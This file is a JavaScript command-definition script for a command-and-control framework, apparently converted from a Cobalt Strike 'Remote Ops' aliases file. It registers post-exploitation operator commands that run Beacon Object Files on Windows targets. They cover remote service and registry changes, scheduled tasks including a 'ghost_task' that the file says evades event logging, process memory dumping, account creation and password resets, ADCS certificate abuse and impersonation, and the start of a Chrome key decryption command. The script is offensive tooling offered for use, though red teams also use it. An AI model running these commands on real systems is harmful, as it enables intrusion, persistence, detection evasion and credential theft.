var metadata = {
    name: "cs_remote_ops_remote",
    description: "CS Remote OPs BOF - Service Control, Registry, Scheduled Tasks, Process, User Management, ADCS, Credentials, and Misc (converted from Remote.cna)"
};

// ========================================
// Enumerations
// ========================================

var REGHIVES = {
    "HKCR": 0, "HKCU": 1, "HKLM": 2, "HKU": 3, "HKCU_LOCAL_IMP": 4
};

var REGTYPES = {
    "REG_SZ": 1, "REG_EXPAND_SZ": 2, "REG_BINARY": 3,
    "REG_DWORD": 4, "REG_MULTI_SZ": 7, "REG_QWORD": 11
};

var INTTYPES = { "REG_DWORD": 1, "REG_QWORD": 1 };

var SERVICETYPES = { "1": 0x02, "2": 0x01, "3": 0x10, "4": 0x20 };

// ========================================
// Helpers
// ========================================

function bofPath(agentId, name) {
    return ax.script_dir() + name + "/" + name + "." + ax.arch(agentId) + ".o";
}

function validHive(name) {
    return REGHIVES.hasOwnProperty(name);
}

// ========================================
// 1. SERVICE CONTROL
// ========================================

var serviceCmds = [];

// --- sc_description ---
var cmd_sc_description = ax.create_command(
    "sc_description", "Sets the description of an existing service",
    "sc_description <svcname> <description> [hostname]",
    "Task: set service description"
);
cmd_sc_description.addArgString("svcname", true, "Service name");
cmd_sc_description.addArgString("description", true, "Service description");
cmd_sc_description.addArgString("hostname", false, "Remote hostname");
cmd_sc_description.setPreHook(function(agentId, cmdline, p) {
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr,cstr", [host, p["svcname"], p["description"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "sc_description") + " " + args);
});
serviceCmds.push(cmd_sc_description);

// --- sc_config ---
var cmd_sc_config = ax.create_command(
    "sc_config", "Configures an existing service",
    "sc_config <svcname> <binpath> <errormode> <startmode> [hostname]",
    "Task: configure service"
);
cmd_sc_config.addArgString("svcname", true, "Service name");
cmd_sc_config.addArgString("binpath", true, "Binary path");
cmd_sc_config.addArgInt("errormode", true, "Error mode (0-3)");
cmd_sc_config.addArgInt("startmode", true, "Start mode (2-4)");
cmd_sc_config.addArgString("hostname", false, "Remote hostname");
cmd_sc_config.setPreHook(function(agentId, cmdline, p) {
    var em = p["errormode"];
    var sm = p["startmode"];
    if (em < 0 || em > 3) { ax.console_message(agentId, 6, "errormode must be 0-3"); return; }
    if (sm < 2 || sm > 4) { ax.console_message(agentId, 6, "startmode must be 2-4"); return; }
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr,cstr,short,short", [host, p["svcname"], p["binpath"], em, sm]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "sc_config") + " " + args);
});
serviceCmds.push(cmd_sc_config);

// --- sc_create ---
var cmd_sc_create = ax.create_command(
    "sc_create", "Creates a new service",
    "sc_create <svcname> <displayname> <binpath> <description> <errormode> <startmode> [type] [hostname]",
    "Task: create service"
);
cmd_sc_create.addArgString("svcname", true, "Service name");
cmd_sc_create.addArgString("displayname", true, "Display name");
cmd_sc_create.addArgString("binpath", true, "Binary path");
cmd_sc_create.addArgString("description", true, "Service description");
cmd_sc_create.addArgInt("errormode", true, "Error mode (0-3)");
cmd_sc_create.addArgInt("startmode", true, "Start mode (2-4)");
cmd_sc_create.addArgInt("type", false, "Service type (1-4, default 3)");
cmd_sc_create.addArgString("hostname", false, "Remote hostname");
cmd_sc_create.setPreHook(function(agentId, cmdline, p) {
    var em = p["errormode"];
    var sm = p["startmode"];
    if (em < 0 || em > 3) { ax.console_message(agentId, 6, "errormode must be 0-3"); return; }
    if (sm < 2 || sm > 4) { ax.console_message(agentId, 6, "startmode must be 2-4"); return; }
    var stype = p["type"] || 3;
    if (!SERVICETYPES.hasOwnProperty(String(stype))) { ax.console_message(agentId, 6, "Invalid service type (1-4)"); return; }
    var stypeVal = SERVICETYPES[String(stype)];
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,short,short,short", [host, p["svcname"], p["binpath"], p["displayname"], p["description"], em, sm, stypeVal]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "sc_create") + " " + args);
});
serviceCmds.push(cmd_sc_create);

// --- sc_delete ---
var cmd_sc_delete = ax.create_command(
    "sc_delete", "Deletes a service",
    "sc_delete <svcname> [hostname]",
    "Task: delete service"
);
cmd_sc_delete.addArgString("svcname", true, "Service name");
cmd_sc_delete.addArgString("hostname", false, "Remote hostname");
cmd_sc_delete.setPreHook(function(agentId, cmdline, p) {
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr", [host, p["svcname"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "sc_delete") + " " + args);
});
serviceCmds.push(cmd_sc_delete);

// --- sc_stop ---
var cmd_sc_stop = ax.create_command(
    "sc_stop", "Stops a service",
    "sc_stop <svcname> [hostname]",
    "Task: stop service"
);
cmd_sc_stop.addArgString("svcname", true, "Service name");
cmd_sc_stop.addArgString("hostname", false, "Remote hostname");
cmd_sc_stop.setPreHook(function(agentId, cmdline, p) {
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr", [host, p["svcname"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "sc_stop") + " " + args);
});
serviceCmds.push(cmd_sc_stop);

// --- sc_start ---
var cmd_sc_start = ax.create_command(
    "sc_start", "Starts a service",
    "sc_start <svcname> [hostname]",
    "Task: start service"
);
cmd_sc_start.addArgString("svcname", true, "Service name");
cmd_sc_start.addArgString("hostname", false, "Remote hostname");
cmd_sc_start.setPreHook(function(agentId, cmdline, p) {
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr", [host, p["svcname"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "sc_start") + " " + args);
});
serviceCmds.push(cmd_sc_start);

// --- sc_failure ---
var cmd_sc_failure = ax.create_command(
    "sc_failure", "Changes the actions upon failure",
    "sc_failure <svcname> <resetperiod> <rebootmsg> <command> <numactions> <actions> [hostname]",
    "Task: configure service failure actions"
);
cmd_sc_failure.addArgString("svcname", true, "Service name");
cmd_sc_failure.addArgInt("resetperiod", true, "Reset period in seconds");
cmd_sc_failure.addArgString("rebootmsg", true, "Reboot message (use \"\" for none)");
cmd_sc_failure.addArgString("command", true, "Command to run on failure (use \"\" for none)");
cmd_sc_failure.addArgInt("numactions", true, "Number of actions");
cmd_sc_failure.addArgString("actions", true, "Actions and delays separated by / (e.g. 3/5000/2/800)");
cmd_sc_failure.addArgString("hostname", false, "Remote hostname");
cmd_sc_failure.setPreHook(function(agentId, cmdline, p) {
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr,int,cstr,cstr,short,cstr", [host, p["svcname"], p["resetperiod"], p["rebootmsg"], p["command"], p["numactions"], p["actions"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "sc_failure") + " " + args);
});
serviceCmds.push(cmd_sc_failure);

var grpServices = ax.create_commands_group("Service Control", serviceCmds);
ax.register_commands_group(grpServices, ["beacon"], ["windows"], []);

// ========================================
// 2. REGISTRY
// ========================================

var regCmds = [];

// --- reg_set ---
var cmd_reg_set = ax.create_command(
    "reg_set", "Creates or sets a registry key or value",
    "reg_set [hostname] <hive> <path> <value> <type> <data>",
    "Task: set registry value"
);
cmd_reg_set.addArgString("hostname", false, "Remote hostname (omit for local)");
cmd_reg_set.addArgString("hive", true, "Registry hive (HKLM, HKCU, HKU, HKCR, HKCU_LOCAL_IMP)");
cmd_reg_set.addArgString("path", true, "Registry path");
cmd_reg_set.addArgString("value", true, "Value name (use \"\" for default)");
cmd_reg_set.addArgString("type", true, "Type (REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, REG_QWORD)");
cmd_reg_set.addArgString("data", true, "Data to store");
cmd_reg_set.setPreHook(function(agentId, cmdline, p) {
    var hive = p["hive"];
    if (!validHive(hive)) { ax.console_message(agentId, 6, "Invalid hive: " + hive); return; }
    var regtype = p["type"];
    if (!REGTYPES.hasOwnProperty(regtype)) { ax.console_message(agentId, 6, "Invalid type: " + regtype); return; }
    var host = p["hostname"] || "";
    if (host && host.substring(0, 2) !== "\\\\") host = "\\\\" + host;
    var typeVal = REGTYPES[regtype];
    var packStr, packArgs;
    if (INTTYPES.hasOwnProperty(regtype)) {
        packStr = "cstr,int,cstr,cstr,int,bytes";
        var intBytes = ax.base64_encode(String.fromCharCode(
            parseInt(p["data"]) & 0xFF,
            (parseInt(p["data"]) >> 8) & 0xFF,
            (parseInt(p["data"]) >> 16) & 0xFF,
            (parseInt(p["data"]) >> 24) & 0xFF
        ));
        packArgs = [host, REGHIVES[hive], p["path"], p["value"], typeVal, intBytes];
    } else if (regtype === "REG_BINARY") {
        packStr = "cstr,int,cstr,cstr,int,bytes";
        packArgs = [host, REGHIVES[hive], p["path"], p["value"], typeVal, ax.file_read(p["data"])];
    } else if (regtype === "REG_MULTI_SZ") {
        packStr = "cstr,int,cstr,cstr,int,bytes";
        var parts = p["data"].split(" ");
        var buf = "";
        for (var mi = 0; mi < parts.length; mi++) {
            buf += parts[mi] + "\0";
        }
        buf += "\0";
        packArgs = [host, REGHIVES[hive], p["path"], p["value"], typeVal, ax.base64_encode(buf)];
    } else {
        packStr = "cstr,int,cstr,cstr,int,cstr";
        packArgs = [host, REGHIVES[hive], p["path"], p["value"], typeVal, p["data"]];
    }
    var args = ax.bof_pack(packStr, packArgs);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "reg_set") + " " + args);
});
regCmds.push(cmd_reg_set);

// --- reg_delete ---
var cmd_reg_delete = ax.create_command(
    "reg_delete", "Deletes a registry key or value",
    "reg_delete [hostname] <hive> <path> [value]",
    "Task: delete registry key/value"
);
cmd_reg_delete.addArgString("hostname", false, "Remote hostname (omit for local)");
cmd_reg_delete.addArgString("hive", true, "Registry hive");
cmd_reg_delete.addArgString("path", true, "Registry path");
cmd_reg_delete.addArgString("value", false, "Value to delete (omit to delete the key)");
cmd_reg_delete.setPreHook(function(agentId, cmdline, p) {
    var hive = p["hive"];
    if (!validHive(hive)) { ax.console_message(agentId, 6, "Invalid hive: " + hive); return; }
    var host = p["hostname"] || "";
    if (host && host.substring(0, 2) !== "\\\\") host = "\\\\" + host;
    var key = p["value"] || "";
    var delkey = key === "" ? 1 : 0;
    var args = ax.bof_pack("cstr,int,cstr,cstr,int", [host, REGHIVES[hive], p["path"], key, delkey]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "reg_delete") + " " + args);
});
regCmds.push(cmd_reg_delete);

// --- reg_save ---
var cmd_reg_save = ax.create_command(
    "reg_save", "Saves a registry path and all subkeys to disk",
    "reg_save <hive> <regpath> <fileout>",
    "Task: save registry key to file"
);
cmd_reg_save.addArgString("hive", true, "Registry hive");
cmd_reg_save.addArgString("regpath", true, "Registry path");
cmd_reg_save.addArgString("fileout", true, "Output file path on target");
cmd_reg_save.setPreHook(function(agentId, cmdline, p) {
    var hive = p["hive"];
    if (!validHive(hive)) { ax.console_message(agentId, 6, "Invalid hive: " + hive); return; }
    ax.console_message(agentId, 5, "Note: may require SeBackupPrivilege");
    var args = ax.bof_pack("cstr,cstr,int", [p["regpath"], p["fileout"], REGHIVES[hive]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "reg_save") + " " + args);
});
regCmds.push(cmd_reg_save);

var grpRegistry = ax.create_commands_group("Registry", regCmds);
ax.register_commands_group(grpRegistry, ["beacon"], ["windows"], []);

// ========================================
// 3. SCHEDULED TASKS
// ========================================

var schtaskCmds = [];

// --- schtaskscreate ---
var cmd_schtaskscreate = ax.create_command(
    "schtaskscreate", "Creates a new scheduled task",
    "schtaskscreate [hostname] <username> <password> <taskpath> <usermode> <forcemode>",
    "Task: create scheduled task"
);
cmd_schtaskscreate.addArgString("username", true, "Username (use \"\" for current)");
cmd_schtaskscreate.addArgString("password", true, "Password (use \"\" for current)");
cmd_schtaskscreate.addArgString("taskpath", true, "Task path");
cmd_schtaskscreate.addArgString("usermode", true, "USER, SYSTEM, XML, or PASSWORD");
cmd_schtaskscreate.addArgString("forcemode", true, "CREATE or UPDATE");
cmd_schtaskscreate.addArgFile("xmlfile", true, "XML task definition file");
cmd_schtaskscreate.addArgString("hostname", false, "Remote hostname");
cmd_schtaskscreate.setPreHook(function(agentId, cmdline, p) {
    var modeMap = { "USER": 0, "SYSTEM": 1, "XML": 2, "PASSWORD": 3 };
    var forceMap = { "CREATE": 0, "UPDATE": 1 };
    var mode = modeMap[p["usermode"]];
    var force = forceMap[p["forcemode"]];
    if (mode === undefined) { ax.console_message(agentId, 6, "usermode must be USER, SYSTEM, XML, or PASSWORD"); return; }
    if (force === undefined) { ax.console_message(agentId, 6, "forcemode must be CREATE or UPDATE"); return; }
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,int,int", [host, p["username"], p["password"], p["taskpath"], ax.file_read(p["xmlfile"]), mode, force]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "schtaskscreate") + " " + args);
});
schtaskCmds.push(cmd_schtaskscreate);

// --- schtasksdelete ---
var cmd_schtasksdelete = ax.create_command(
    "schtasksdelete", "Deletes a scheduled task or folder",
    "schtasksdelete [hostname] <taskname> <TASK|FOLDER>",
    "Task: delete scheduled task"
);
cmd_schtasksdelete.addArgString("taskname", true, "Task or folder name");
cmd_schtasksdelete.addArgString("type", true, "TASK or FOLDER");
cmd_schtasksdelete.addArgString("hostname", false, "Remote hostname");
cmd_schtasksdelete.setPreHook(function(agentId, cmdline, p) {
    var typeUpper = p["type"].toUpperCase();
    if (typeUpper !== "TASK" && typeUpper !== "FOLDER") { ax.console_message(agentId, 6, "Type must be TASK or FOLDER"); return; }
    var isfolder = typeUpper === "FOLDER" ? 1 : 0;
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr,int", [host, p["taskname"], isfolder]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "schtasksdelete") + " " + args);
});
schtaskCmds.push(cmd_schtasksdelete);

// --- schtasksstop ---
var cmd_schtasksstop = ax.create_command(
    "schtasksstop", "Stops a scheduled task",
    "schtasksstop [hostname] <taskname>",
    "Task: stop scheduled task"
);
cmd_schtasksstop.addArgString("taskname", true, "Scheduled task name (full path)");
cmd_schtasksstop.addArgString("hostname", false, "Remote hostname");
cmd_schtasksstop.setPreHook(function(agentId, cmdline, p) {
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr", [host, p["taskname"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "schtasksstop") + " " + args);
});
schtaskCmds.push(cmd_schtasksstop);

// --- schtasksrun ---
var cmd_schtasksrun = ax.create_command(
    "schtasksrun", "Run a scheduled task",
    "schtasksrun [hostname] <taskname>",
    "Task: run scheduled task"
);
cmd_schtasksrun.addArgString("taskname", true, "Scheduled task name (full path)");
cmd_schtasksrun.addArgString("hostname", false, "Remote hostname");
cmd_schtasksrun.setPreHook(function(agentId, cmdline, p) {
    var host = p["hostname"] || "";
    var args = ax.bof_pack("cstr,cstr", [host, p["taskname"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "schtasksrun") + " " + args);
});
schtaskCmds.push(cmd_schtasksrun);

// --- ghost_task ---
var cmd_ghost_task = ax.create_command(
    "ghost_task", "Create or delete a scheduled task without triggering events 4698/106",
    "ghost_task <hostname> <add|delete> <taskname> [program] [argument] [username] [scheduletype] [time] [day]",
    "Task: ghost scheduled task"
);
cmd_ghost_task.addArgString("hostname", true, "Hostname or localhost");
cmd_ghost_task.addArgString("operation", true, "add or delete");
cmd_ghost_task.addArgString("taskname", true, "Task name");
cmd_ghost_task.addArgString("program", false, "Program to execute");
cmd_ghost_task.addArgString("argument", false, "Program arguments");
cmd_ghost_task.addArgString("username", false, "User account for the task");
cmd_ghost_task.addArgString("scheduletype", false, "second, daily, weekly, or logon");
cmd_ghost_task.addArgString("time", false, "Time (HH:MM) or interval in seconds");
cmd_ghost_task.addArgString("day", false, "Days for weekly (e.g. monday,thursday)");
cmd_ghost_task.setPreHook(function(agentId, cmdline, p) {
    var op = p["operation"].toLowerCase();
    var host = p["hostname"].toLowerCase();
    var taskname = p["taskname"].toLowerCase();
    var args;

    if (op === "add") {
        if (!p["program"] || !p["username"] || !p["scheduletype"]) {
            ax.console_message(agentId, 6, "add requires: program, argument, username, scheduletype");
            return;
        }
        var program = p["program"].toLowerCase();
        var argument = (p["argument"] || "").toLowerCase();
        var username = p["username"].toLowerCase();
        var sched = p["scheduletype"].toLowerCase();
        var time = (p["time"] || "").toLowerCase();
        var day = (p["day"] || "").toLowerCase();

        if (sched === "weekly") {
            var arglen = 10;
            args = ax.bof_pack("int,cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [arglen, host, op, taskname, program, argument, username, sched, time, day]);
        } else if (sched === "second" || sched === "daily") {
            var arglen2 = 9;
            args = ax.bof_pack("int,cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [arglen2, host, op, taskname, program, argument, username, sched, time]);
        } else if (sched === "logon") {
            var arglen3 = 8;
            args = ax.bof_pack("int,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [arglen3, host, op, taskname, program, argument, username, sched]);
        } else {
            ax.console_message(agentId, 6, "Unknown schedule type: " + sched);
            return;
        }
    } else if (op === "delete") {
        args = ax.bof_pack("int,cstr,cstr,cstr", [4, host, op, taskname]);
    } else {
        ax.console_message(agentId, 6, "Operation must be add or delete");
        return;
    }
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "ghost_task") + " " + args);
});
schtaskCmds.push(cmd_ghost_task);

var grpSchtasks = ax.create_commands_group("Scheduled Tasks", schtaskCmds);
ax.register_commands_group(grpSchtasks, ["beacon"], ["windows"], []);

// ========================================
// 4. PROCESS
// ========================================

var procCmds = [];

// --- procdump ---
var cmd_procdump = ax.create_command(
    "procdump", "Dumps a process to a file using MiniDumpWriteDump",
    "procdump <pid> <fileout>",
    "Task: dump process memory"
);
cmd_procdump.addArgInt("pid", true, "PID to dump");
cmd_procdump.addArgString("fileout", true, "Output file path on target");
cmd_procdump.setPreHook(function(agentId, cmdline, p) {
    ax.console_message(agentId, 5, "Note: may require SeDebugPrivilege");
    var args = ax.bof_pack("int,cstr", [p["pid"], p["fileout"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "procdump") + " " + args);
});
procCmds.push(cmd_procdump);

// --- ProcessListHandles ---
var cmd_plh = ax.create_command(
    "ProcessListHandles", "Lists open handles in a process",
    "ProcessListHandles <pid>",
    "Task: list process handles"
);
cmd_plh.addArgInt("pid", true, "PID to list handles of");
cmd_plh.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("int", [p["pid"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "ProcessListHandles") + " " + args);
});
procCmds.push(cmd_plh);

// --- ProcessDestroy ---
var cmd_pd = ax.create_command(
    "ProcessDestroy", "Closes handle(s) in a process",
    "ProcessDestroy <pid> [handleid]",
    "Task: close process handles"
);
cmd_pd.addArgInt("pid", true, "PID to close handles in");
cmd_pd.addArgInt("handleid", false, "Specific handle ID (omit to close all)");
cmd_pd.setPreHook(function(agentId, cmdline, p) {
    var handle = p["handleid"] || 0;
    var args = ax.bof_pack("int,int", [p["pid"], handle]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "ProcessDestroy") + " " + args);
});
procCmds.push(cmd_pd);

// --- suspend ---
var cmd_suspend = ax.create_command(
    "suspend", "Suspend a process by PID",
    "suspend <pid>",
    "Task: suspend process"
);
cmd_suspend.addArgInt("pid", true, "PID to suspend");
cmd_suspend.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("short,int", [1, p["pid"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "suspendresume") + " " + args);
});
procCmds.push(cmd_suspend);

// --- resume ---
var cmd_resume = ax.create_command(
    "resume", "Resume a process by PID",
    "resume <pid>",
    "Task: resume process"
);
cmd_resume.addArgInt("pid", true, "PID to resume");
cmd_resume.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("short,int", [0, p["pid"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "suspendresume") + " " + args);
});
procCmds.push(cmd_resume);

// --- get_priv ---
var cmd_get_priv = ax.create_command(
    "get_priv", "Activate a token privilege",
    "get_priv <privilege_name>",
    "Task: enable token privilege"
);
cmd_get_priv.addArgString("privilege", true, "Privilege name (e.g. SeDebugPrivilege)");
cmd_get_priv.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("cstr", [p["privilege"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "get_priv") + " " + args);
});
procCmds.push(cmd_get_priv);

// --- shutdown ---
var cmd_shutdown = ax.create_command(
    "shutdown", "Shutdown or reboot a local or remote system",
    "shutdown <hostname> <message> <time> <closeapps> <reboot>",
    "Task: shutdown/reboot system"
);
cmd_shutdown.addArgString("hostname", true, "Hostname (use \"\" for local)");
cmd_shutdown.addArgString("message", true, "Message (use \"\" for none)");
cmd_shutdown.addArgInt("time", true, "Seconds before shutdown");
cmd_shutdown.addArgInt("closeapps", true, "0=allow save, 1=force close");
cmd_shutdown.addArgInt("reboot", true, "0=shutdown, 1=reboot");
cmd_shutdown.setPreHook(function(agentId, cmdline, p) {
    var ca = p["closeapps"];
    var rb = p["reboot"];
    if ((ca !== 0 && ca !== 1) || (rb !== 0 && rb !== 1)) {
        ax.console_message(agentId, 6, "closeapps and reboot must be 0 or 1");
        return;
    }
    var args = ax.bof_pack("cstr,cstr,int,short,short", [p["hostname"], p["message"], p["time"], ca, rb]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "shutdown") + " " + args);
});
procCmds.push(cmd_shutdown);

// --- stayawake ---
var cmd_stayawake = ax.create_command(
    "stayawake", "Set execution state to keep system/display awake",
    "stayawake <awake> [away] [display]",
    "Task: set execution state"
);
cmd_stayawake.addArgInt("awake", true, "Keep system awake (0 or 1)");
cmd_stayawake.addArgInt("away", false, "Enable away mode (0 or 1, default 0)");
cmd_stayawake.addArgInt("display", false, "Keep display awake (0 or 1, default 0)");
cmd_stayawake.setPreHook(function(agentId, cmdline, p) {
    var awake = p["awake"];
    var away = p["away"] || 0;
    var display = p["display"] || 0;
    if (awake !== 0 && awake !== 1) { ax.console_message(agentId, 6, "awake must be 0 or 1"); return; }
    if (awake === 0 && (away !== 0 || display !== 0)) { ax.console_message(agentId, 6, "away and display only valid when awake is 1"); return; }
    var args = ax.bof_pack("short,short,short", [awake, away, display]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "stayawake") + " " + args);
});
procCmds.push(cmd_stayawake);

var grpProcess = ax.create_commands_group("Process & System", procCmds);
ax.register_commands_group(grpProcess, ["beacon"], ["windows"], []);

// ========================================
// 5. USER MANAGEMENT
// ========================================

var userCmds = [];

// --- enableuser ---
var cmd_enableuser = ax.create_command(
    "enableuser", "Enables and unlocks a user account",
    "enableuser <username> <domain>",
    "Task: enable user account"
);
cmd_enableuser.addArgString("username", true, "Username");
cmd_enableuser.addArgString("domain", true, "Domain (use \"\" for local)");
cmd_enableuser.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("cstr,cstr", [p["domain"], p["username"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "enableuser") + " " + args);
});
userCmds.push(cmd_enableuser);

// --- unexpireuser ---
var cmd_unexpireuser = ax.create_command(
    "unexpireuser", "Unexpires a user account",
    "unexpireuser <username> <domain>",
    "Task: unexpire user account"
);
cmd_unexpireuser.addArgString("username", true, "Username");
cmd_unexpireuser.addArgString("domain", true, "Domain (use \"\" for local)");
cmd_unexpireuser.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("cstr,cstr", [p["domain"], p["username"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "unexpireuser") + " " + args);
});
userCmds.push(cmd_unexpireuser);

// --- setuserpass ---
var cmd_setuserpass = ax.create_command(
    "setuserpass", "Sets a user's password",
    "setuserpass <username> <password> <domain>",
    "Task: set user password"
);
cmd_setuserpass.addArgString("username", true, "Username");
cmd_setuserpass.addArgString("password", true, "New password");
cmd_setuserpass.addArgString("domain", true, "Domain (use \"\" for local)");
cmd_setuserpass.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("cstr,cstr,cstr", [p["domain"], p["username"], p["password"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "setuserpass") + " " + args);
});
userCmds.push(cmd_setuserpass);

// --- addusertogroup ---
var cmd_addusertogroup = ax.create_command(
    "addusertogroup", "Add a user to a group",
    "addusertogroup <username> <groupname> <server> <domain>",
    "Task: add user to group"
);
cmd_addusertogroup.addArgString("username", true, "Username");
cmd_addusertogroup.addArgString("groupname", true, "Group name");
cmd_addusertogroup.addArgString("server", true, "Target server (use \"\" for local)");
cmd_addusertogroup.addArgString("domain", true, "Domain (use \"\" for local)");
cmd_addusertogroup.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("cstr,cstr,cstr,cstr", [p["domain"], p["server"], p["username"], p["groupname"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "addusertogroup") + " " + args);
});
userCmds.push(cmd_addusertogroup);

// --- adduser ---
var cmd_adduser = ax.create_command(
    "adduser", "Add a new user to a machine",
    "adduser <username> <password> [server]",
    "Task: add user account"
);
cmd_adduser.addArgString("username", true, "Username");
cmd_adduser.addArgString("password", true, "Password");
cmd_adduser.addArgString("server", false, "Remote server (omit for local)");
cmd_adduser.setPreHook(function(agentId, cmdline, p) {
    var server = p["server"] || "";
    var args = ax.bof_pack("cstr,cstr,cstr", [p["username"], p["password"], server]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "adduser") + " " + args);
});
userCmds.push(cmd_adduser);

var grpUsers = ax.create_commands_group("User Management", userCmds);
ax.register_commands_group(grpUsers, ["beacon"], ["windows"], []);

// ========================================
// 6. ADCS (Active Directory Certificate Services)
// ========================================

var adcsCmds = [];

// --- adcs_request ---
var cmd_adcs_request = ax.create_command(
    "adcs_request", "Request an enrollment certificate",
    "adcs_request <CA> [template] [subject] [altname] [alturl] [install] [machine] [app_policy] [dns]",
    "Task: request ADCS certificate"
);
cmd_adcs_request.addArgString("ca", true, "Certificate authority");
cmd_adcs_request.addArgString("template", false, "Certificate template");
cmd_adcs_request.addArgString("subject", false, "Subject DN");
cmd_adcs_request.addArgString("altname", false, "Alternate subject DN");
cmd_adcs_request.addArgString("alturl", false, "SAN URL entry");
cmd_adcs_request.addArgInt("install", false, "Install cert (0=no, 1=yes)");
cmd_adcs_request.addArgInt("machine", false, "Machine cert (0=no, 1=yes)");
cmd_adcs_request.addArgInt("app_policy", false, "Add app policy for ESC15 (0=no, 1=yes)");
cmd_adcs_request.addArgInt("dns", false, "SAN as DNS (1) or UPN (0)");
cmd_adcs_request.setPreHook(function(agentId, cmdline, p) {
    var template = p["template"] || "";
    var subject = p["subject"] || "";
    var altname = p["altname"] || "";
    var alturl = p["alturl"] || "";
    var install = p["install"] || 0;
    var machine = p["machine"] || 0;
    var app_policy = p["app_policy"] || 0;
    var dns = p["dns"] || 0;
    var args = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,short,short,short,short", [p["ca"], template, subject, altname, alturl, install, machine, app_policy, dns]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "adcs_request") + " " + args);
});
adcsCmds.push(cmd_adcs_request);

// --- adcs_request_on_behalf ---
var cmd_adcs_rob = ax.create_command(
    "adcs_request_on_behalf", "Request a certificate on behalf of another user",
    "adcs_request_on_behalf <template> <requester> <enrollment_pfx> <download_name>",
    "Task: request cert on behalf"
);
cmd_adcs_rob.addArgString("template", true, "Certificate template");
cmd_adcs_rob.addArgString("requester", true, "Domain\\username to impersonate");
cmd_adcs_rob.addArgFile("enrollment_pfx", true, "Path to enrollment agent .pfx");
cmd_adcs_rob.addArgString("download_name", true, "Name for downloaded output .pfx");
cmd_adcs_rob.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("cstr,cstr,cstr,bytes", [p["template"], p["requester"], p["download_name"], ax.file_read(p["enrollment_pfx"])]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "adcs_request_on_behalf") + " " + args);
});
adcsCmds.push(cmd_adcs_rob);

// --- make_token_cert ---
var cmd_make_token_cert = ax.create_command(
    "make_token_cert", "Impersonate using a .pfx certificate",
    "make_token_cert <pfx_file> [password]",
    "Task: impersonate via certificate"
);
cmd_make_token_cert.addArgFile("pfx_file", true, "Path to .pfx file");
cmd_make_token_cert.addArgString("password", false, "PFX password");
cmd_make_token_cert.setPreHook(function(agentId, cmdline, p) {
    var password = p["password"] || "";
    var args = ax.bof_pack("bytes,cstr", [ax.file_read(p["pfx_file"]), password]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "make_token_cert") + " " + args);
});
adcsCmds.push(cmd_make_token_cert);

var grpADCS = ax.create_commands_group("ADCS & Certificates", adcsCmds);
ax.register_commands_group(grpADCS, ["beacon"], ["windows"], []);

// ========================================
// 7. CREDENTIAL THEFT & TOKENS
// ========================================

var credCmds = [];

// --- chromeKey ---
var cmd_chromeKey = ax.create_command(
    "chromeKey", "Decrypt the Chrome encryption key",
    "chromeKey",
    "Task: decrypt Chrome key"
);
